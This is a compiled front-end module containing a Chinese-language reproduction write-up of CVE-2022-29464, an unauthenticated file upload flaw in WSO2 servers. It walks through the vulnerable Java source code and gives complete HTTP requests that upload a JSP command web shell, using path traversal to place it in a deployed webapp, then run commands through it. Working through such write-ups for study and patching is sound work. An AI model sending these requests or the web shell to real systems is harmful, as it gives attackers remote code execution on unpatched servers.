import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as d,c as r,a as e,b as n,d as t,e as a}from"./app-58e4a7d6.js";const o={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>WSO2 API Manager 2.2.0 and above
WSO2 Identity Server 5.2.0 and above
WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0
WSO2 Identity Server as Key Manager 5.3.0 and above
WSO2 Enterprise Integrator 6.2.0 and above
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,5),c={href:"https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip",target:"_blank",rel:"noopener noreferrer"},p=a(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>下载 releases 后进入 bin目录, 执行 api.manager.sh文件，并开启 debug 方便远程调试</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241641592.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>打开 product-apim-4.0.0 ，下载依赖，连接Debug进行调试分析</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241641901.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>运行后访问 localhost:9443 出现如下即搭建完成</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241642560.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在配置文件 identity.xml 中我们可以看到 路由 <code>/fileupload</code> 中不存在权限鉴定, 对应的 Servlet 为 FileUploadServlet</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241642432.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>文件上传为POST请求，对应的处理方法为 <code>doPost (org.wso2.carbon.ui.transports.FileUploadServlet#doPost)</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>protected void doPost(HttpServletRequest request,
                          HttpServletResponse response) throws ServletException, IOException {

        try {
            fileUploadExecutorManager.execute(request, response);
        } catch (Exception e) {
            String msg = &quot;File upload failed &quot;;
            log.error(msg, e);
            throw new ServletException(e);
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>继续向下，略过调用方法的过程</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>execute:55, ToolsAnyFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)
executeGeneric:104, AbstractFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)
execute:436, FileUploadExecutorManager$CarbonXmlFileUploadExecHandler (org.wso2.carbon.ui.transports.fileupload)
startExec:320, FileUploadExecutorManager$FileUploadExecutionHandlerManager (org.wso2.carbon.ui.transports.fileupload)
execute:127, FileUploadExecutorManager (org.wso2.carbon.ui.transports.fileupload)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241642357.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241642961.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>最后来到出现漏洞的位置 <code>org.wso2.carbon.ui.transports.fileupload.ToolsAnyFileUploadExecutor#execute</code></p><p>这里我们构造请求包，上传文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /fileupload/toolsAny HTTP/1.1
Host: localhost:9443
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 729
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0

--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name=&quot;1.jsp&quot;; filename=&quot;1.jsp&quot;

&lt;FORM&gt;
    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
&lt;/FORM&gt;
&lt;%@ page import=&quot;java.io.*&quot; %&gt;
    &lt;%
    String cmd = request.getParameter(&quot;cmd&quot;);
    String output = &quot;&quot;;
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%&gt;
        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
--4ef9f369a86bfaadf5ec3177278d49c0--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241642011.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上传时文件名为 1.jsp，成功上传目标会返回 uuid 值, 调试过程中我们可以发现文件被上传在某个目录下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241642860.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public class ToolsAnyFileUploadExecutor extends AbstractFileUploadExecutor {

	@Override
	public boolean execute(HttpServletRequest request,
			HttpServletResponse response) throws CarbonException, IOException {
		PrintWriter out = response.getWriter();
        try {
        	Map fileResourceMap =
                (Map) configurationContext
                        .getProperty(ServerConstants.FILE_RESOURCE_MAP);
        	if (fileResourceMap == null) {
        		fileResourceMap = new TreeBidiMap();
        		configurationContext.setProperty(ServerConstants.FILE_RESOURCE_MAP,
                                             fileResourceMap);
        	}
            List&lt;FileItemData&gt; fileItems = getAllFileItems();
            //String filePaths = &quot;&quot;;

            for (FileItemData fileItem : fileItems) {
                String uuid = String.valueOf(
                        System.currentTimeMillis() + Math.random());
                String serviceUploadDir =
                        configurationContext
                                .getProperty(ServerConstants.WORK_DIR) +
                                File.separator +
                                &quot;extra&quot; + File
                                .separator +
                                uuid + File.separator;
                File dir = new File(serviceUploadDir);
                if (!dir.exists()) {
                    dir.mkdirs();
                }
                File uploadedFile = new File(dir, fileItem.getFileItem().getFieldName());
                try (FileOutputStream fileOutStream = new FileOutputStream(uploadedFile)) {
                    fileItem.getDataHandler().writeTo(fileOutStream);
                    fileOutStream.flush();
                }
                response.setContentType(&quot;text/plain; charset=utf-8&quot;);
                //filePaths = filePaths + uploadedFile.getAbsolutePath() + &quot;,&quot;;
                fileResourceMap.put(uuid, uploadedFile.getAbsolutePath());
                out.write(uuid);
            }
            //filePaths = filePaths.substring(0, filePaths.length() - 1);
            //out.write(filePaths);
            out.flush();
        } catch (Exception e) {
            log.error(&quot;File upload FAILED&quot;, e);
            out.write(&quot;&lt;script type=\\&quot;text/javascript\\&quot;&gt;&quot; +
                    &quot;top.wso2.wsf.Util.alertWarning(&#39;File upload FAILED. File may be non-existent or invalid.&#39;);&quot; +
                    &quot;&lt;/script&gt;&quot;);
        } finally {
            out.close();
        }
        return true;
	}

}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241643581.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>但文件名是我们可控的，拼接的过程中我们通过控制文件名遍历目录，将文件上传到我们需要的位置, 查找可以解析 jsp文件的目录</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241643426.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造请求包，通过控制文件名的方法上传至该目录中</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /fileupload/toolsAny HTTP/1.1
Host: localhost:9443
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 729
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0

--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp&quot;; filename=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp&quot;

&lt;FORM&gt;
    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
&lt;/FORM&gt;
&lt;%@ page import=&quot;java.io.*&quot; %&gt;
    &lt;%
    String cmd = request.getParameter(&quot;cmd&quot;);
    String output = &quot;&quot;;
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%&gt;
        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
--4ef9f369a86bfaadf5ec3177278d49c0--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241643756.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问上传的文件，<code>/authenticationendpoint/xxx.jsp?cmd=ls</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241643038.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,30);function m(b,g){const i=s("ExternalLinkIcon");return d(),r("div",null,[u,e("p",null,[e("a",c,[n("https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip"),t(i)])]),e("p",null,[e("a",v,[n("https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip"),t(i)])]),p])}const x=l(o,[["render",m],["__file","WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464.html.vue"]]);export{x as default};
